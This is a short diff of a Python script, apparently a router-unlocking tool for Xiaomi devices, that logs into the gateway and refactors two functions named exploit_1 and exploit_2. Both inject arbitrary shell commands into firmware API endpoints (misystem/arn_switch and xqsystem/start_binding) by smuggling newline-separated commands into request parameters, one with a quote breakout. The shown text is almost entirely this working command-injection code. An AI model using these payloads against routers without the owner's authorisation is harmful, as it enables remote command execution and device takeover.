@@ -39,23 +39,19 @@ print(f'Current CountryCode = {ccode}')
 stok = gw.web_login()
 
 
-def exploit_1(cmd = { }, api = 'misystem/arn_switch'):
+def exploit_1(cmd, api = 'API/misystem/arn_switch'):
     # vuln/exploit author: ?????????
-    params = cmd
-    if isinstance(cmd, str):
-        cmd = cmd.replace(';', '\n')
-        params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
-    res = requests.get(gw.apiurl + api, params = params)
-    return res.text
+    cmd = cmd.replace(';', '\n')
+    params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
+    res = gw.api_request(api, params, resp = 'text')
+    return res
 
-def exploit_2(cmd = { }, api = 'xqsystem/start_binding'):
+def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
     # vuln/exploit author: ?????????
-    params = cmd
-    if isinstance(cmd, str):
-        cmd = cmd.replace(';', '\n')
-        params = { 'uid': 1234, 'key': "1234'\n" + cmd + "\n'" }
-    res = requests.get(gw.apiurl + api, params = params)
-    return res.text
+    cmd = cmd.replace(';', '\n')
+    params = { 'uid': 1234, 'key': "1234'\n" + cmd + "\n'" }
+    res = gw.api_request(api, params, resp = 'text')
+    return res
 
 
 # get device orig system time
